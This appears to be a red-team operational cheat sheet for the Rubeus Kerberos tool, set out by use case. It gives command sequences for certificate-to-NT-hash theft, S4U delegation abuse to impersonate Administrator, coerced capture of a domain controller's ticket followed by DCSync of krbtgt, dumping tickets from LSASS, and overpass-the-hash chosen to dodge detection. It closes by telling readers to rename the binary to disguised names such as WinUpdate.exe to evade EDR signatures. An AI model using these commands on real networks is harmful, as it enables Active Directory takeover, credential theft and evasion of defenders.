---
name: Rubeus Full Operational Reference
category: kerberos
subcategories: [all-commands, s4u, asktgt, monitor, operational-reference]
tradecraft_tags: [rubeus, kerberos, operational-reference, all-commands, tickets, pkinit, s4u]
mitre_attack: []
source:
  url: https://github.com/GhostPack/Rubeus
  license: BSD-3-Clause
  maintained: true
binary_type: .net-assembly
binary_filename: Rubeus.exe
supported_os: [windows]
architecture: [x64, x86]
privilege_required: domain-user
network_required: true
detection_signal: |
  See rubeus.md for detection notes. This is a supplementary operational reference.
usage_examples:
  - description: See rubeus.md
    args: "(see rubeus.md)"
opsec_notes: |
  See rubeus.md. This file provides supplementary operational context.
gotchas: |
  See rubeus.md.
related_ttps: [rubeus, certify, whisker, constrained-delegation-abuse, adcs-esc8]
alternatives: []
common_args: {}
last_updated: 2026-05-29
---

# Rubeus Operational Reference (Supplementary)

> See `rubeus.md` for the canonical schema entry and Full Reference section.
> This file provides operational cheat-sheet patterns organized by use case.

## Use Case Quick Reference

### Use Case 1: ADCS Certificate → NT Hash (No Crack)

```
# After Certify/Certipy gives you a PFX cert for administrator:
Rubeus.exe asktgt /user:administrator /certificate:<base64-pfx> \
           /domain:north.sevenkingdoms.local /getcredentials /show /nowrap /ptt
# Result: TGT injected + NT hash printed
# Next: Apollo pth /user:administrator /ntlm:<hash>
```

### Use Case 2: Constrained Delegation S4U Chain

```
# Account has constrained delegation with protocol transition:
# Step 1: Get TGT for delegating account
Rubeus.exe asktgt /user:svc-delegating /rc4:<hash> /domain:DOMAIN /nowrap

# Step 2: S4U chain
Rubeus.exe s4u /ticket:<TGT-b64> /impersonateuser:Administrator \
           /msdsspn:cifs/WINTERFELL.north.sevenkingdoms.local \
           /altservice:host,winrm,cifs /ptt /nowrap
```

### Use Case 3: Unconstrained Delegation TGT Capture

```
# On machine with unconstrained delegation:
# Start monitoring (filter to DC$ auth from coercion):
Rubeus.exe monitor /interval:1 /filteruser:KINGSLANDING$

# (Trigger coercion in separate session: SpoolSample, Coercer, etc.)

# Rubeus outputs captured TGT:
Rubeus.exe ptt /ticket:<captured-TGT>

# Now impersonate DC for DCSync:
Apollo: dcsync /domain:north.sevenkingdoms.local /user:krbtgt
```

### Use Case 4: RBCD Exploitation (Post-StandIn Setup)

```
# StandIn has already written RBCD for mypc01$ on VICTIM$
# Step 1: TGT for mypc01$
Rubeus.exe asktgt /user:mypc01$ /password:'P@ssw0rd1!' \
           /domain:DOMAIN /nowrap

# Step 2: S4U chain
Rubeus.exe s4u /ticket:<TGT> /impersonateuser:Administrator \
           /msdsspn:cifs/VICTIM.DOMAIN /altservice:host,winrm,cifs /ptt
```

### Use Case 5: PKINIT + UnPAC-the-Hash (Whisker Output)

```
# Whisker outputs this command directly after shadow cred add:
Rubeus.exe asktgt /user:<target> /certificate:<b64-pfx> \
           /password:<pfxpw> /domain:DOMAIN /dc:DC_FQDN \
           /getcredentials /show /nowrap
# Result: NT hash without any cracking
```

### Use Case 6: Kerberoast Inventory (No Crack Path)

```
# Enumerate kerberoastable accounts without requesting hashes:
Rubeus.exe kerberoast /ldaponly
# Output: account list + SPN list
# Use this to: find accounts to target via ADCS/delegation/shadow-creds instead
```

### Use Case 7: TGT Harvest for Lateral Movement

```
# Dump all TGTs from current session (check for interesting accounts):
Rubeus.exe triage         # List what's available
Rubeus.exe dump /nowrap   # Dump all (opens LSASS — high signal)

# Preferred (no LSASS open — use KerbDump BOF in Athena instead):
execute-bof KerbDump.x64.o    # Athena only
```

### Use Case 8: Overpass-the-Hash (AES keys)

```
# Preferred: AES256 key avoids RC4/etype-23 detection
Rubeus.exe asktgt /user:administrator /aes256:<aes256key> \
           /domain:DOMAIN /nowrap /ptt

# RC4 (fallback when AES not available):
Rubeus.exe asktgt /user:administrator /rc4:<nthash> \
           /domain:DOMAIN /nowrap /ptt
```

## Output Formats

| Flag | Output format |
|------|--------------|
| (default) | Base64 wrapped at 76 chars |
| `/nowrap` | Base64 single line (for piping/ptt) |
| `/outfile:X` | .kirbi file to disk |
| `/ptt` | Inject into current session |

## Renaming Before Use

CRITICAL: The literal string "Rubeus" is signatured by many EDR vendors.
Always rename before upload:

```
mv Rubeus.exe WinUpdate.exe
mv Rubeus.exe svcmon.exe
mv Rubeus.exe krbticket.exe
```
